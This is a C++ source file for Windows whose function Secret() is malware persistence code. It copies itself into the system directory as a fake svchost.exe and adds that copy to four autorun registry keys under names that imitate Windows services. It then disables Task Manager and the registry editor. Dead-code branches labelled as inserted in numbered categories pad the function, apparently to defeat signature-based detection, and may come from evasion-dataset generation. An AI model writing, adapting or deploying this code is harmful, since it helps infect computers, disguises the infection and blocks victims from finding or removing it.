#include "data_globals.h"
#include <windows.h>
#include <cstring>
#include <stdio.h>   // For sprintf_s
#include <time.h>
#include <cstdlib>   // ← ADDED for malloc/free

void Secret(LPCSTR sourceFilePath)
{
    char systemPath[MAX_PATH];
    HKEY hKey;
    BYTE enable[4] = {1, 0, 0, 0};

    // --- INSERTED DEAD BRANCH 1 (Category A: System info queries, Pattern A) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // Dead branch: system info queries and dummy computations
        volatile SYSTEM_INFO si;
        volatile SYSTEMTIME st;
        volatile char dummy_buf[128];
        volatile DWORD dummy_result = 0;

        GetSystemInfo((LPSYSTEM_INFO)&si);
        GetLocalTime((LPSYSTEMTIME)&st);

        // Dummy loop computing polynomial hash over dummy_buf
        for (int i = 0; i < 4; i++) {
            dummy_buf[i] = (char)(i * 3 + 7);
            dummy_result ^= (dummy_buf[i] << (i * 2));
        }

        // Additional dummy compute with GetUserNameA and GetComputerNameA
        char userName[64];
        char compName[64];
        DWORD sizeU = sizeof(userName);
        DWORD sizeC = sizeof(compName);
        if (GetUserNameA(userName, &sizeU)) {
            for (int j = 0; j < 2; j++) {
                dummy_result ^= (DWORD)userName[j] << (j * 4);
            }
        }
        if (GetComputerNameA(compName, &sizeC)) {
            for (int k = 0; k < 2; k++) {
                dummy_result ^= (DWORD)compName[k] << (k * 6);
            }
        }

        // Second dummy loop with bitwise operations
        volatile int hash_val = 0x811C9DC5;
        for (int m = 0; m < 3; m++) {
            hash_val ^= (m * 0xAA);
            hash_val *= 0x01000193;
            dummy_result += (DWORD)hash_val;
        }

        // Discard dummy result and clear buffer
        (void)dummy_result;
        SecureZeroMemory((PVOID)&dummy_buf, sizeof(dummy_buf));
    }

    GetSystemDirectoryA(systemPath, MAX_PATH);

    size_t len = strlen(systemPath);
    strcpy(systemPath + len, "\\Generic");
    CreateDirectoryA(systemPath, NULL);

    len = strlen(systemPath);
    strcpy(systemPath + len, "\\svchost.exe");
    CopyFileA(sourceFilePath, systemPath, FALSE);

    // --- INSERTED DEAD BRANCH 2 (Category C: Bitwise/Math loops, Pattern C) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        // Dead branch: bitwise/math loops with FNV-1a style hash
        volatile unsigned char dummy_data[64];
        volatile DWORD dummy_hash = 0x811C9DC5;
        volatile DWORD dummy_acc = 0;

        // Initialize dummy buffer
        for (int idx = 0; idx < 16; idx++) {
            dummy_data[idx] = (unsigned char)(idx * 0x55 + 0x12);
        }

        // Dummy loop 1: XOR and hash
        for (int i = 0; i < 8; i++) {
            dummy_hash ^= dummy_data[i];
            dummy_hash *= 0x01000193;
            dummy_acc ^= (DWORD)dummy_data[i] << (i % 4);
        }

        // Dummy loop 2: polynomial accumulation with fixed constants
        volatile unsigned int poly = 0;
        for (int j = 0; j < 6; j++) {
            poly = (poly * 0x41C64E6D) + 0x3039;
            dummy_acc ^= poly;
            dummy_acc = (dummy_acc << 1) | (dummy_acc >> 31);
        }

        // Additional bitwise operations on dummy buffer
        for (int k = 0; k < 4; k++) {
            dummy_data[k] ^= (unsigned char)(k * 0xAA);
            dummy_data[k] += (unsigned char)(k + 5);
            dummy_acc += (DWORD)dummy_data[k];
        }

        // Third loop: simple arithmetic that discards result
        volatile int discard = 0;
        for (int m = 0; m < 2; m++) {
            discard = (discard * 3 + 7) % 97;
            dummy_acc ^= (DWORD)discard;
        }

        (void)dummy_hash;
        (void)dummy_acc;
        SecureZeroMemory((PVOID)&dummy_data, sizeof(dummy_data));
    }

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Generic Host Process for Win32 Services", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Updater", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Server", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Generic", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    // --- INSERTED DEAD BRANCH 3 (Category B: Memory & String operations, Pattern B) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Dead branch: memory and string operations with malloc, sprintf_s, strlen, memcpy, memset
        volatile char* pDummy = NULL;
        volatile char dummy_str1[64];
        volatile char dummy_str2[64];
        volatile int dummy_len = 0;
        volatile size_t dummy_size = 0;

        // Use malloc and free
        pDummy = (char*)malloc(128);
        if (pDummy) {
            // Use sprintf_s to fill buffer
            sprintf_s((char*)pDummy, 128, "DummyData_%08X", GetTickCount());
            dummy_len = strlen((const char*)pDummy);

            // Use memcpy to copy data
            memcpy((void*)dummy_str1, (const void*)pDummy, (dummy_len < 64) ? dummy_len : 63);
            dummy_str1[63] = '\0';

            // Use memset to clear part of buffer
            memset((void*)dummy_str2, 0xAA, 32);

            // Use strcpy and strlen in loops
            for (int i = 0; i < 3; i++) {
                strcpy((char*)dummy_str2, (const char*)dummy_str1);
                dummy_size += strlen((const char*)dummy_str2);
                // Alter some bytes
                dummy_str2[i] = (char)(dummy_str2[i] ^ 0x55);
            }

            // Additional memory operations
            volatile DWORD dummy_sum = 0;
            for (int j = 0; j < 8; j++) {
                dummy_sum ^= (DWORD)((unsigned char*)dummy_str1)[j];
                dummy_sum = (dummy_sum << 1) | (dummy_sum >> 31);
            }

            // Clear and free
            SecureZeroMemory((PVOID)pDummy, 128);
            free((void*)pDummy);
            (void)dummy_len;
            (void)dummy_size;
            (void)dummy_sum;
        }
    }

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableTaskMgr", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableRegistrytools", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(hKey);
}
